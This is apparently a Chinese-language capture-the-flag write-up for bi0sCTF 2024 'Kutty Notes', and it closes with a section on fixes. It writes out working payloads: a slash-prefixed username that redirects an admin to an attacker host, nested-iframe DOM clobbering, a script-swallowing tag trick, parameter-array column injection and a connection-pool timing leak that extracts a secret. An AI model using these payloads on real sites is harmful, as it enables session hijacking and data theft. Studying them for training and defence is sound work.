# bi0sCTF 2024 - Kutty Notes

## 题目简述

Kutty Notes 允许用户创建笔记并交给管理员机器人审核。管理员登录后打开 `/verify`；页面会加载所有用户和笔记，前端脚本依据全局变量 `rows` 判断举报是否针对管理员，并在违规时访问 `/<user>/block?block=true`。

解法分两段：先利用 HTML 注入和 DOM Clobbering 把审核页重定向到攻击者页面，再在管理员会话中利用 `/search` 的可控列列表制造响应体大小差异，通过连接池拥塞的 XS-Leak 逐字符恢复作为笔记标题保存的 flag。

## 解题过程

### 让管理员跳转到攻击页

注册用户名时允许字母、数字、点、斜杠和连字符，且只禁止用户名中出现字面量 `admin`。因此可注册形如：

```text
/attacker.example
```

审核页中的敏感逻辑为：

```javascript
if (rows[i].author.username == 'admin') {
  document.location = `/${user}/block?block=true`;
}
```

当 `user` 本身以 `/` 开头时，模板得到的目标是 `//attacker.example/block?...`，浏览器会把它解释为同协议外站 URL。

接着创建一篇包含嵌套命名 iframe 的笔记：

```html
<iframe name="rows" srcdoc="
  <iframe name=rows srcdoc=&quot;
    <a id='author' href='//admin:a@example.invalid'></a>
  &quot;></iframe>
"></iframe>
```

最内层锚点的 URL 用户名属性为 `admin`。命名 iframe 和 `id=author` 组成的 DOM Clobbering 链使审核脚本看到近似 `rows[0].author.username == 'admin'` 的对象结构。

页面原本还会加载 `/js/verify.js`，其中的顶层 `let rows` 会妨碍命名属性。官方 payload 在正文末尾增加未闭合的：

```html
<script type="text/plain">
```

模板随后出现的第一个 `</script>` 会结束这段纯文本脚本，从而吞掉外部脚本标签；后面的内联审核代码仍会执行，此时 `rows` 由命名 DOM 提供。大量 `blocking="render"` 的同源样式表标签用于延长和稳定导航窗口。管理员最终被重定向到攻击者页面。

### 把搜索条件变成响应大小 oracle

`/search` 读取：

```javascript
const query = req.query.q || "";
const filter = req.query.f || "*";

Post.query()
  .column(filter)
  .where("title", "LIKE", `%${query}%`)
  .andWhere("author", req.session.username);
```

原始查询串只允许字母、数字和 `&=[]_`，看似阻止了注入，但参数解析器会把重复参数及对象键解析成数组或对象。官方利用构造约 900 个 `f=content`，再附加 `f[k]=content`。Knex 把该结构展开为大量列或别名；若标题匹配，模板会重复渲染很多份 `content`，响应显著增大。若标题不匹配，结果集为空，响应很小。

管理员的 flag 初始化为标题，正文则是一份较大的 HTML 模板，因此可从已知前缀 `bi0sctf_` 开始，测试：

```text
/search?f=content&f=content&...&f[k]=content&q=bi0sctf_<candidate>
```

### 用连接池拥塞测出匹配结果

攻击页先向多个受控的慢速端口发起大量 `fetch`，占满或接近占满浏览器的连接资源，再通过 `window.open` 请求候选搜索 URL。与此同时发出若干到攻击端的轻量请求并测量完成时间。

如果候选前缀正确，数据库返回一条 admin 笔记，900 份内容让同源响应传输和渲染更慢，连接资源被占用更久；候选错误时结果为空，资源很快释放。先分别用必不匹配字符串和已知正确前缀校准两组时间，再取中间值作阈值。对十六进制字符逐个重复多次并取平均，可以恢复 flag 的未知部分。

该侧信道不需要跨源读取响应正文：攻击者只观察自己页面中请求调度受到的延迟。结束每个字符的测量后要关闭测试窗口，并用 `AbortController` 取消占位请求，避免上一轮残留连接污染下一轮。

## 方法总结

本题先用 DOM Clobbering 改写审核脚本所依赖的对象图，再利用允许斜杠的用户名把站内封禁路径变成协议相对外链。取得管理员浏览上下文后，重复查询参数又把“可控查询列”放大成响应体大小差异；连接池拥塞把这一差异转换为跨源可测时间。修复时既要对模板中的笔记正文做服务端净化，也要把用户名用于 URL 前做编码，并将搜索字段映射到固定列白名单，而不是把解析后的复合对象直接交给查询构造器。
